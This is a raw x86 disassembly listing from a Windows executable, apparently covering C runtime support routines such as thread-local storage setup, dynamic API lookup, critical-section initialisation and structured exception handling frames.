  402b78:	6a 01                	push   $0x1
  402b7a:	e8 31 3a 00 00       	call   0x4065b0
  402b7f:	8b f0                	mov    %eax,%esi
  402b81:	59                   	pop    %ecx
  402b82:	59                   	pop    %ecx
  402b83:	85 f6                	test   %esi,%esi
  402b85:	74 12                	je     0x402b99
  402b87:	56                   	push   %esi
  402b88:	ff 35 90 90 41 00    	push   0x419090
  402b8e:	e8 bc 02 00 00       	call   0x402e4f
  402b93:	59                   	pop    %ecx
  402b94:	59                   	pop    %ecx
  402b95:	85 c0                	test   %eax,%eax
  402b97:	75 12                	jne    0x402bab
  402b99:	33 db                	xor    %ebx,%ebx
  402b9b:	53                   	push   %ebx
  402b9c:	ff 35 90 90 41 00    	push   0x419090
  402ba2:	e8 a8 02 00 00       	call   0x402e4f
  402ba7:	59                   	pop    %ecx
  402ba8:	59                   	pop    %ecx
  402ba9:	eb 04                	jmp    0x402baf
  402bab:	8b de                	mov    %esi,%ebx
  402bad:	33 f6                	xor    %esi,%esi
  402baf:	56                   	push   %esi
  402bb0:	e8 fb 38 00 00       	call   0x4064b0
  402bb5:	59                   	pop    %ecx
  402bb6:	5e                   	pop    %esi
  402bb7:	57                   	push   %edi
  402bb8:	ff 15 6c 20 41 00    	call   *0x41206c
  402bbe:	5f                   	pop    %edi
  402bbf:	8b c3                	mov    %ebx,%eax
  402bc1:	5b                   	pop    %ebx
  402bc2:	c3                   	ret
  402bc3:	68 07 2b 40 00       	push   $0x402b07
  402bc8:	e8 d1 01 00 00       	call   0x402d9e
  402bcd:	a3 90 90 41 00       	mov    %eax,0x419090
  402bd2:	59                   	pop    %ecx
  402bd3:	83 f8 ff             	cmp    $0xffffffff,%eax
  402bd6:	75 03                	jne    0x402bdb
  402bd8:	32 c0                	xor    %al,%al
  402bda:	c3                   	ret
  402bdb:	68 f8 9c 41 00       	push   $0x419cf8
  402be0:	50                   	push   %eax
  402be1:	e8 69 02 00 00       	call   0x402e4f
  402be6:	59                   	pop    %ecx
  402be7:	59                   	pop    %ecx
  402be8:	85 c0                	test   %eax,%eax
  402bea:	75 07                	jne    0x402bf3
  402bec:	e8 05 00 00 00       	call   0x402bf6
  402bf1:	eb e5                	jmp    0x402bd8
  402bf3:	b0 01                	mov    $0x1,%al
  402bf5:	c3                   	ret
  402bf6:	a1 90 90 41 00       	mov    0x419090,%eax
  402bfb:	83 f8 ff             	cmp    $0xffffffff,%eax
  402bfe:	74 11                	je     0x402c11
  402c00:	50                   	push   %eax
  402c01:	e8 d3 01 00 00       	call   0x402dd9
  402c06:	59                   	pop    %ecx
  402c07:	c7 05 90 90 41 00 ff 	movl   $0xffffffff,0x419090
  402c0e:	ff ff ff 
  402c11:	b0 01                	mov    $0x1,%al
  402c13:	c3                   	ret
  402c14:	56                   	push   %esi
  402c15:	57                   	push   %edi
  402c16:	bf 20 9d 41 00       	mov    $0x419d20,%edi
  402c1b:	33 f6                	xor    %esi,%esi
  402c1d:	6a 00                	push   $0x0
  402c1f:	68 a0 0f 00 00       	push   $0xfa0
  402c24:	57                   	push   %edi
  402c25:	e8 63 02 00 00       	call   0x402e8d
  402c2a:	83 c4 0c             	add    $0xc,%esp
  402c2d:	85 c0                	test   %eax,%eax
  402c2f:	74 15                	je     0x402c46
  402c31:	ff 05 38 9d 41 00    	incl   0x419d38
  402c37:	83 c6 18             	add    $0x18,%esi
  402c3a:	83 c7 18             	add    $0x18,%edi
  402c3d:	83 fe 18             	cmp    $0x18,%esi
  402c40:	72 db                	jb     0x402c1d
  402c42:	b0 01                	mov    $0x1,%al
  402c44:	eb 07                	jmp    0x402c4d
  402c46:	e8 05 00 00 00       	call   0x402c50
  402c4b:	32 c0                	xor    %al,%al
  402c4d:	5f                   	pop    %edi
  402c4e:	5e                   	pop    %esi
  402c4f:	c3                   	ret
  402c50:	56                   	push   %esi
  402c51:	8b 35 38 9d 41 00    	mov    0x419d38,%esi
  402c57:	85 f6                	test   %esi,%esi
  402c59:	74 20                	je     0x402c7b
  402c5b:	6b c6 18             	imul   $0x18,%esi,%eax
  402c5e:	57                   	push   %edi
  402c5f:	8d b8 08 9d 41 00    	lea    0x419d08(%eax),%edi
  402c65:	57                   	push   %edi
  402c66:	ff 15 78 20 41 00    	call   *0x412078
  402c6c:	ff 0d 38 9d 41 00    	decl   0x419d38
  402c72:	83 ef 18             	sub    $0x18,%edi
  402c75:	83 ee 01             	sub    $0x1,%esi
  402c78:	75 eb                	jne    0x402c65
  402c7a:	5f                   	pop    %edi
  402c7b:	b0 01                	mov    $0x1,%al
  402c7d:	5e                   	pop    %esi
  402c7e:	c3                   	ret
  402c7f:	cc                   	int3
  402c80:	53                   	push   %ebx
  402c81:	51                   	push   %ecx
  402c82:	bb a0 90 41 00       	mov    $0x4190a0,%ebx
  402c87:	e9 0f 00 00 00       	jmp    0x402c9b
  402c8c:	cc                   	int3
  402c8d:	cc                   	int3
  402c8e:	cc                   	int3
  402c8f:	cc                   	int3
  402c90:	53                   	push   %ebx
  402c91:	51                   	push   %ecx
  402c92:	bb a0 90 41 00       	mov    $0x4190a0,%ebx
  402c97:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402c9b:	89 4b 08             	mov    %ecx,0x8(%ebx)
  402c9e:	89 43 04             	mov    %eax,0x4(%ebx)
  402ca1:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  402ca4:	55                   	push   %ebp
  402ca5:	51                   	push   %ecx
  402ca6:	50                   	push   %eax
  402ca7:	58                   	pop    %eax
  402ca8:	59                   	pop    %ecx
  402ca9:	5d                   	pop    %ebp
  402caa:	59                   	pop    %ecx
  402cab:	5b                   	pop    %ebx
  402cac:	c2 04 00             	ret    $0x4
  402caf:	cc                   	int3
  402cb0:	ff d0                	call   *%eax
  402cb2:	c3                   	ret
  402cb3:	55                   	push   %ebp
  402cb4:	8b ec                	mov    %esp,%ebp
  402cb6:	51                   	push   %ecx
  402cb7:	51                   	push   %ecx
  402cb8:	8b 45 08             	mov    0x8(%ebp),%eax
  402cbb:	57                   	push   %edi
  402cbc:	8d 04 85 48 9d 41 00 	lea    0x419d48(,%eax,4),%eax
  402cc3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402cc6:	8b 00                	mov    (%eax),%eax
  402cc8:	90                   	nop
  402cc9:	83 cf ff             	or     $0xffffffff,%edi
  402ccc:	3b c7                	cmp    %edi,%eax
  402cce:	75 04                	jne    0x402cd4
  402cd0:	33 c0                	xor    %eax,%eax
  402cd2:	eb 56                	jmp    0x402d2a
  402cd4:	85 c0                	test   %eax,%eax
  402cd6:	75 52                	jne    0x402d2a
  402cd8:	53                   	push   %ebx
  402cd9:	8b 5d 10             	mov    0x10(%ebp),%ebx
  402cdc:	56                   	push   %esi
  402cdd:	eb 3d                	jmp    0x402d1c
  402cdf:	8b 0b                	mov    (%ebx),%ecx
  402ce1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402ce4:	8d 04 8d 3c 9d 41 00 	lea    0x419d3c(,%ecx,4),%eax
  402ceb:	8b 30                	mov    (%eax),%esi
  402ced:	90                   	nop
  402cee:	85 f6                	test   %esi,%esi
  402cf0:	74 06                	je     0x402cf8
  402cf2:	3b f7                	cmp    %edi,%esi
  402cf4:	75 46                	jne    0x402d3c
  402cf6:	eb 21                	jmp    0x402d19
  402cf8:	ff 34 8d 90 2b 41 00 	push   0x412b90(,%ecx,4)
  402cff:	e8 4f 00 00 00       	call   0x402d53
  402d04:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402d07:	8b f0                	mov    %eax,%esi
  402d09:	59                   	pop    %ecx
  402d0a:	8d 0c 95 3c 9d 41 00 	lea    0x419d3c(,%edx,4),%ecx
  402d11:	85 f6                	test   %esi,%esi
  402d13:	75 18                	jne    0x402d2d
  402d15:	8b c7                	mov    %edi,%eax
  402d17:	87 01                	xchg   %eax,(%ecx)
  402d19:	83 c3 04             	add    $0x4,%ebx
  402d1c:	3b 5d 14             	cmp    0x14(%ebp),%ebx
  402d1f:	75 be                	jne    0x402cdf
  402d21:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402d24:	87 3a                	xchg   %edi,(%edx)
  402d26:	33 c0                	xor    %eax,%eax
  402d28:	5e                   	pop    %esi
  402d29:	5b                   	pop    %ebx
  402d2a:	5f                   	pop    %edi
  402d2b:	c9                   	leave
  402d2c:	c3                   	ret
  402d2d:	8b c6                	mov    %esi,%eax
  402d2f:	87 01                	xchg   %eax,(%ecx)
  402d31:	85 c0                	test   %eax,%eax
  402d33:	74 07                	je     0x402d3c
  402d35:	56                   	push   %esi
  402d36:	ff 15 90 20 41 00    	call   *0x412090
  402d3c:	ff 75 0c             	push   0xc(%ebp)
  402d3f:	56                   	push   %esi
  402d40:	ff 15 94 20 41 00    	call   *0x412094
  402d46:	85 c0                	test   %eax,%eax
  402d48:	74 d7                	je     0x402d21
  402d4a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402d4d:	8b c8                	mov    %eax,%ecx
  402d4f:	87 0a                	xchg   %ecx,(%edx)
  402d51:	eb d5                	jmp    0x402d28
  402d53:	55                   	push   %ebp
  402d54:	8b ec                	mov    %esp,%ebp
  402d56:	68 00 08 00 00       	push   $0x800
  402d5b:	6a 00                	push   $0x0
  402d5d:	ff 75 08             	push   0x8(%ebp)
  402d60:	ff 15 98 20 41 00    	call   *0x412098
  402d66:	85 c0                	test   %eax,%eax
  402d68:	75 32                	jne    0x402d9c
  402d6a:	ff 15 68 20 41 00    	call   *0x412068
  402d70:	83 f8 57             	cmp    $0x57,%eax
  402d73:	75 25                	jne    0x402d9a
  402d75:	6a 07                	push   $0x7
  402d77:	68 28 2c 41 00       	push   $0x412c28
  402d7c:	ff 75 08             	push   0x8(%ebp)
  402d7f:	e8 1c 39 00 00       	call   0x4066a0
  402d84:	83 c4 0c             	add    $0xc,%esp
  402d87:	85 c0                	test   %eax,%eax
  402d89:	74 0f                	je     0x402d9a
  402d8b:	6a 00                	push   $0x0
  402d8d:	6a 00                	push   $0x0
  402d8f:	ff 75 08             	push   0x8(%ebp)
  402d92:	ff 15 98 20 41 00    	call   *0x412098
  402d98:	5d                   	pop    %ebp
  402d99:	c3                   	ret
  402d9a:	33 c0                	xor    %eax,%eax
  402d9c:	5d                   	pop    %ebp
  402d9d:	c3                   	ret
  402d9e:	55                   	push   %ebp
  402d9f:	8b ec                	mov    %esp,%ebp
  402da1:	56                   	push   %esi
  402da2:	68 40 2c 41 00       	push   $0x412c40
  402da7:	68 38 2c 41 00       	push   $0x412c38
  402dac:	68 40 2c 41 00       	push   $0x412c40
  402db1:	6a 00                	push   $0x0
  402db3:	e8 fb fe ff ff       	call   0x402cb3
  402db8:	8b f0                	mov    %eax,%esi
  402dba:	83 c4 10             	add    $0x10,%esp
  402dbd:	85 f6                	test   %esi,%esi
  402dbf:	74 10                	je     0x402dd1
  402dc1:	ff 75 08             	push   0x8(%ebp)
  402dc4:	8b ce                	mov    %esi,%ecx
  402dc6:	ff 15 48 21 41 00    	call   *0x412148
  402dcc:	ff d6                	call   *%esi
  402dce:	5e                   	pop    %esi
  402dcf:	5d                   	pop    %ebp
  402dd0:	c3                   	ret
  402dd1:	5e                   	pop    %esi
  402dd2:	5d                   	pop    %ebp
  402dd3:	ff 25 80 20 41 00    	jmp    *0x412080
  402dd9:	55                   	push   %ebp
  402dda:	8b ec                	mov    %esp,%ebp
  402ddc:	56                   	push   %esi
  402ddd:	68 54 2c 41 00       	push   $0x412c54
  402de2:	68 4c 2c 41 00       	push   $0x412c4c
  402de7:	68 54 2c 41 00       	push   $0x412c54
  402dec:	6a 01                	push   $0x1
  402dee:	e8 c0 fe ff ff       	call   0x402cb3
  402df3:	83 c4 10             	add    $0x10,%esp
  402df6:	8b f0                	mov    %eax,%esi
  402df8:	ff 75 08             	push   0x8(%ebp)
  402dfb:	85 f6                	test   %esi,%esi
  402dfd:	74 0c                	je     0x402e0b
  402dff:	8b ce                	mov    %esi,%ecx
  402e01:	ff 15 48 21 41 00    	call   *0x412148
  402e07:	ff d6                	call   *%esi
  402e09:	eb 06                	jmp    0x402e11
  402e0b:	ff 15 8c 20 41 00    	call   *0x41208c
  402e11:	5e                   	pop    %esi
  402e12:	5d                   	pop    %ebp
  402e13:	c3                   	ret
  402e14:	55                   	push   %ebp
  402e15:	8b ec                	mov    %esp,%ebp
  402e17:	56                   	push   %esi
  402e18:	68 64 2c 41 00       	push   $0x412c64
  402e1d:	68 5c 2c 41 00       	push   $0x412c5c
  402e22:	68 64 2c 41 00       	push   $0x412c64
  402e27:	6a 02                	push   $0x2
  402e29:	e8 85 fe ff ff       	call   0x402cb3
  402e2e:	83 c4 10             	add    $0x10,%esp
  402e31:	8b f0                	mov    %eax,%esi
  402e33:	ff 75 08             	push   0x8(%ebp)
  402e36:	85 f6                	test   %esi,%esi
  402e38:	74 0c                	je     0x402e46
  402e3a:	8b ce                	mov    %esi,%ecx
  402e3c:	ff 15 48 21 41 00    	call   *0x412148
  402e42:	ff d6                	call   *%esi
  402e44:	eb 06                	jmp    0x402e4c
  402e46:	ff 15 84 20 41 00    	call   *0x412084
  402e4c:	5e                   	pop    %esi
  402e4d:	5d                   	pop    %ebp
  402e4e:	c3                   	ret
  402e4f:	55                   	push   %ebp
  402e50:	8b ec                	mov    %esp,%ebp
  402e52:	56                   	push   %esi
  402e53:	68 78 2c 41 00       	push   $0x412c78
  402e58:	68 70 2c 41 00       	push   $0x412c70
  402e5d:	68 78 2c 41 00       	push   $0x412c78
  402e62:	6a 03                	push   $0x3
  402e64:	e8 4a fe ff ff       	call   0x402cb3
  402e69:	83 c4 10             	add    $0x10,%esp
  402e6c:	8b f0                	mov    %eax,%esi
  402e6e:	ff 75 0c             	push   0xc(%ebp)
  402e71:	ff 75 08             	push   0x8(%ebp)
  402e74:	85 f6                	test   %esi,%esi
  402e76:	74 0c                	je     0x402e84
  402e78:	8b ce                	mov    %esi,%ecx
  402e7a:	ff 15 48 21 41 00    	call   *0x412148
  402e80:	ff d6                	call   *%esi
  402e82:	eb 06                	jmp    0x402e8a
  402e84:	ff 15 88 20 41 00    	call   *0x412088
  402e8a:	5e                   	pop    %esi
  402e8b:	5d                   	pop    %ebp
  402e8c:	c3                   	ret
  402e8d:	55                   	push   %ebp
  402e8e:	8b ec                	mov    %esp,%ebp
  402e90:	56                   	push   %esi
  402e91:	68 8c 2c 41 00       	push   $0x412c8c
  402e96:	68 84 2c 41 00       	push   $0x412c84
  402e9b:	68 8c 2c 41 00       	push   $0x412c8c
  402ea0:	6a 04                	push   $0x4
  402ea2:	e8 0c fe ff ff       	call   0x402cb3
  402ea7:	8b f0                	mov    %eax,%esi
  402ea9:	83 c4 10             	add    $0x10,%esp
  402eac:	85 f6                	test   %esi,%esi
  402eae:	74 15                	je     0x402ec5
  402eb0:	ff 75 10             	push   0x10(%ebp)
  402eb3:	8b ce                	mov    %esi,%ecx
  402eb5:	ff 75 0c             	push   0xc(%ebp)
  402eb8:	ff 75 08             	push   0x8(%ebp)
  402ebb:	ff 15 48 21 41 00    	call   *0x412148
  402ec1:	ff d6                	call   *%esi
  402ec3:	eb 0c                	jmp    0x402ed1
  402ec5:	ff 75 0c             	push   0xc(%ebp)
  402ec8:	ff 75 08             	push   0x8(%ebp)
  402ecb:	ff 15 7c 20 41 00    	call   *0x41207c
  402ed1:	5e                   	pop    %esi
  402ed2:	5d                   	pop    %ebp
  402ed3:	c3                   	ret
  402ed4:	55                   	push   %ebp
  402ed5:	8b ec                	mov    %esp,%ebp
  402ed7:	51                   	push   %ecx
  402ed8:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  402edb:	53                   	push   %ebx
  402edc:	56                   	push   %esi
  402edd:	57                   	push   %edi
  402ede:	8b 7d 18             	mov    0x18(%ebp),%edi
  402ee1:	8b 57 0c             	mov    0xc(%edi),%edx
  402ee4:	8b f2                	mov    %edx,%esi
  402ee6:	8b 5f 10             	mov    0x10(%edi),%ebx
  402ee9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402eec:	85 c9                	test   %ecx,%ecx
  402eee:	78 2d                	js     0x402f1d
  402ef0:	6b c2 14             	imul   $0x14,%edx,%eax
  402ef3:	83 c3 08             	add    $0x8,%ebx
  402ef6:	03 c3                	add    %ebx,%eax
  402ef8:	8b 5d 10             	mov    0x10(%ebp),%ebx
  402efb:	83 fa ff             	cmp    $0xffffffff,%edx
  402efe:	74 3d                	je     0x402f3d
  402f00:	83 e8 14             	sub    $0x14,%eax
  402f03:	4a                   	dec    %edx
  402f04:	39 58 fc             	cmp    %ebx,-0x4(%eax)
  402f07:	7d 04                	jge    0x402f0d
  402f09:	3b 18                	cmp    (%eax),%ebx
  402f0b:	7e 05                	jle    0x402f12
  402f0d:	83 fa ff             	cmp    $0xffffffff,%edx
  402f10:	75 07                	jne    0x402f19
  402f12:	8b 75 fc             	mov    -0x4(%ebp),%esi
  402f15:	49                   	dec    %ecx
  402f16:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402f19:	85 c9                	test   %ecx,%ecx
  402f1b:	79 de                	jns    0x402efb
  402f1d:	42                   	inc    %edx
  402f1e:	3b 77 0c             	cmp    0xc(%edi),%esi
  402f21:	77 1a                	ja     0x402f3d
  402f23:	3b d6                	cmp    %esi,%edx
  402f25:	77 16                	ja     0x402f3d
  402f27:	8b 45 08             	mov    0x8(%ebp),%eax
  402f2a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402f2d:	5f                   	pop    %edi
  402f2e:	89 70 0c             	mov    %esi,0xc(%eax)
  402f31:	5e                   	pop    %esi
  402f32:	89 08                	mov    %ecx,(%eax)
  402f34:	89 50 04             	mov    %edx,0x4(%eax)
  402f37:	89 48 08             	mov    %ecx,0x8(%eax)
  402f3a:	5b                   	pop    %ebx
  402f3b:	c9                   	leave
  402f3c:	c3                   	ret
  402f3d:	e8 1d 36 00 00       	call   0x40655f
  402f42:	cc                   	int3
  402f43:	55                   	push   %ebp
  402f44:	8b ec                	mov    %esp,%ebp
  402f46:	83 ec 18             	sub    $0x18,%esp
  402f49:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402f4c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  402f4f:	33 05 40 90 41 00    	xor    0x419040,%eax
  402f55:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402f58:	8b 45 0c             	mov    0xc(%ebp),%eax
  402f5b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402f5e:	8b 45 14             	mov    0x14(%ebp),%eax
  402f61:	40                   	inc    %eax
  402f62:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402f69:	c7 45 ec 26 31 40 00 	movl   $0x403126,-0x14(%ebp)
  402f70:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402f73:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402f76:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402f7c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402f7f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  402f82:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402f88:	ff 75 18             	push   0x18(%ebp)
  402f8b:	51                   	push   %ecx
  402f8c:	ff 75 10             	push   0x10(%ebp)
  402f8f:	e8 dc 10 00 00       	call   0x404070
  402f94:	8b c8                	mov    %eax,%ecx
  402f96:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402f99:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402f9f:	8b c1                	mov    %ecx,%eax
  402fa1:	c9                   	leave
  402fa2:	c3                   	ret
  402fa3:	55                   	push   %ebp
  402fa4:	8b ec                	mov    %esp,%ebp
  402fa6:	83 ec 3c             	sub    $0x3c,%esp
  402fa9:	53                   	push   %ebx
  402faa:	81 7d 08 23 01 00 00 	cmpl   $0x123,0x8(%ebp)
  402fb1:	75 12                	jne    0x402fc5
  402fb3:	b8 76 30 40 00       	mov    $0x403076,%eax
  402fb8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402fbb:	89 01                	mov    %eax,(%ecx)
  402fbd:	33 c0                	xor    %eax,%eax
  402fbf:	40                   	inc    %eax
  402fc0:	e9 da 00 00 00       	jmp    0x40309f
  402fc5:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  402fcc:	c7 45 c8 c3 31 40 00 	movl   $0x4031c3,-0x38(%ebp)
  402fd3:	a1 40 90 41 00       	mov    0x419040,%eax
  402fd8:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402fdb:	33 c1                	xor    %ecx,%eax
  402fdd:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402fe0:	8b 45 18             	mov    0x18(%ebp),%eax
  402fe3:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402fe6:	8b 45 0c             	mov    0xc(%ebp),%eax
  402fe9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402fec:	8b 45 1c             	mov    0x1c(%ebp),%eax
  402fef:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402ff2:	8b 45 20             	mov    0x20(%ebp),%eax
  402ff5:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402ff8:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402fff:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  403006:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40300d:	89 65 e0             	mov    %esp,-0x20(%ebp)
  403010:	89 6d e4             	mov    %ebp,-0x1c(%ebp)
  403013:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403019:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40301c:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40301f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403025:	8b 45 08             	mov    0x8(%ebp),%eax
  403028:	ff 30                	push   (%eax)
  40302a:	e8 d1 df 00 00       	call   0x411000
  40302f:	59                   	pop    %ecx
  403030:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403033:	89 01                	mov    %eax,(%ecx)
  403035:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40303c:	8b 45 08             	mov    0x8(%ebp),%eax
  40303f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403042:	8b 45 10             	mov    0x10(%ebp),%eax
  403045:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403048:	e8 d6 fa ff ff       	call   0x402b23
  40304d:	8b 40 08             	mov    0x8(%eax),%eax
  403050:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403053:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403056:	e8 89 36 00 00       	call   0x4066e4
  40305b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40305e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403061:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403064:	50                   	push   %eax
  403065:	8b 45 08             	mov    0x8(%ebp),%eax
  403068:	ff 30                	push   (%eax)
  40306a:	ff 55 f4             	call   *-0xc(%ebp)
  40306d:	59                   	pop    %ecx
  40306e:	59                   	pop    %ecx
  40306f:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403076:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  40307a:	74 17                	je     0x403093
  40307c:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  403083:	8b 03                	mov    (%ebx),%eax
  403085:	8b 5d c4             	mov    -0x3c(%ebp),%ebx
  403088:	89 03                	mov    %eax,(%ebx)
  40308a:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  403091:	eb 09                	jmp    0x40309c
  403093:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403096:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40309c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40309f:	5b                   	pop    %ebx
  4030a0:	c9                   	leave
  4030a1:	c3                   	ret
  4030a2:	55                   	push   %ebp
  4030a3:	8b ec                	mov    %esp,%ebp
  4030a5:	51                   	push   %ecx
  4030a6:	53                   	push   %ebx
  4030a7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4030aa:	83 c0 0c             	add    $0xc,%eax
  4030ad:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4030b0:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  4030b7:	8b 03                	mov    (%ebx),%eax
  4030b9:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4030bf:	8b 45 08             	mov    0x8(%ebp),%eax
  4030c2:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4030c5:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  4030c8:	8b 63 fc             	mov    -0x4(%ebx),%esp
  4030cb:	ff e0                	jmp    *%eax
  4030cd:	5b                   	pop    %ebx
  4030ce:	c9                   	leave
  4030cf:	c2 08 00             	ret    $0x8
  4030d2:	55                   	push   %ebp
  4030d3:	8b ec                	mov    %esp,%ebp
  4030d5:	51                   	push   %ecx
  4030d6:	51                   	push   %ecx
  4030d7:	53                   	push   %ebx
  4030d8:	56                   	push   %esi
  4030d9:	57                   	push   %edi
  4030da:	64 8b 35 00 00 00 00 	mov    %fs:0x0,%esi
  4030e1:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4030e4:	c7 45 fc fd 30 40 00 	movl   $0x4030fd,-0x4(%ebp)
  4030eb:	6a 00                	push   $0x0
  4030ed:	ff 75 0c             	push   0xc(%ebp)
  4030f0:	ff 75 fc             	push   -0x4(%ebp)
  4030f3:	ff 75 08             	push   0x8(%ebp)
  4030f6:	ff 15 64 20 41 00    	call   *0x412064
  4030fc:	90                   	nop
  4030fd:	8b 45 0c             	mov    0xc(%ebp),%eax
  403100:	8b 40 04             	mov    0x4(%eax),%eax
  403103:	83 e0 fd             	and    $0xfffffffd,%eax
  403106:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403109:	89 41 04             	mov    %eax,0x4(%ecx)
  40310c:	64 8b 3d 00 00 00 00 	mov    %fs:0x0,%edi
  403113:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  403116:	89 3b                	mov    %edi,(%ebx)
  403118:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  40311f:	5f                   	pop    %edi
  403120:	5e                   	pop    %esi
  403121:	5b                   	pop    %ebx
  403122:	c9                   	leave
  403123:	c2 08 00             	ret    $0x8
  403126:	55                   	push   %ebp
  403127:	8b ec                	mov    %esp,%ebp
  403129:	56                   	push   %esi
  40312a:	fc                   	cld
  40312b:	8b 75 0c             	mov    0xc(%ebp),%esi
  40312e:	8b 4e 08             	mov    0x8(%esi),%ecx
  403131:	33 ce                	xor    %esi,%ecx
  403133:	e8 43 ec ff ff       	call   0x401d7b
  403138:	6a 00                	push   $0x0
  40313a:	56                   	push   %esi
  40313b:	ff 76 14             	push   0x14(%esi)
  40313e:	ff 76 0c             	push   0xc(%esi)
  403141:	6a 00                	push   $0x0
  403143:	ff 75 10             	push   0x10(%ebp)
  403146:	ff 76 10             	push   0x10(%esi)
  403149:	ff 75 08             	push   0x8(%ebp)
  40314c:	e8 0b 0a 00 00       	call   0x403b5c
  403151:	83 c4 20             	add    $0x20,%esp
  403154:	5e                   	pop    %esi
  403155:	5d                   	pop    %ebp
  403156:	c3                   	ret
  403157:	55                   	push   %ebp
  403158:	8b ec                	mov    %esp,%ebp
  40315a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40315d:	56                   	push   %esi
  40315e:	8b 75 08             	mov    0x8(%ebp),%esi
  403161:	89 0e                	mov    %ecx,(%esi)
  403163:	e8 bb f9 ff ff       	call   0x402b23
  403168:	8b 48 24             	mov    0x24(%eax),%ecx
  40316b:	89 4e 04             	mov    %ecx,0x4(%esi)
  40316e:	e8 b0 f9 ff ff       	call   0x402b23
  403173:	89 70 24             	mov    %esi,0x24(%eax)
  403176:	8b c6                	mov    %esi,%eax
  403178:	5e                   	pop    %esi
  403179:	5d                   	pop    %ebp
  40317a:	c3                   	ret
  40317b:	55                   	push   %ebp
  40317c:	8b ec                	mov    %esp,%ebp
  40317e:	56                   	push   %esi
  40317f:	e8 9f f9 ff ff       	call   0x402b23
  403184:	8b 75 08             	mov    0x8(%ebp),%esi
  403187:	3b 70 24             	cmp    0x24(%eax),%esi
  40318a:	75 0e                	jne    0x40319a
  40318c:	8b 76 04             	mov    0x4(%esi),%esi
  40318f:	e8 8f f9 ff ff       	call   0x402b23
  403194:	89 70 24             	mov    %esi,0x24(%eax)
  403197:	5e                   	pop    %esi
  403198:	5d                   	pop    %ebp
  403199:	c3                   	ret
  40319a:	e8 84 f9 ff ff       	call   0x402b23
  40319f:	8b 48 24             	mov    0x24(%eax),%ecx
  4031a2:	83 c1 04             	add    $0x4,%ecx
  4031a5:	eb 07                	jmp    0x4031ae
  4031a7:	3b f0                	cmp    %eax,%esi
  4031a9:	74 0b                	je     0x4031b6
  4031ab:	8d 48 04             	lea    0x4(%eax),%ecx
  4031ae:	8b 01                	mov    (%ecx),%eax
  4031b0:	85 c0                	test   %eax,%eax
  4031b2:	74 09                	je     0x4031bd
  4031b4:	eb f1                	jmp    0x4031a7
  4031b6:	8b 46 04             	mov    0x4(%esi),%eax
  4031b9:	89 01                	mov    %eax,(%ecx)
  4031bb:	eb da                	jmp    0x403197
  4031bd:	e8 9d 33 00 00       	call   0x40655f
  4031c2:	cc                   	int3
  4031c3:	55                   	push   %ebp
  4031c4:	8b ec                	mov    %esp,%ebp
  4031c6:	51                   	push   %ecx
  4031c7:	53                   	push   %ebx
  4031c8:	fc                   	cld
  4031c9:	8b 45 0c             	mov    0xc(%ebp),%eax
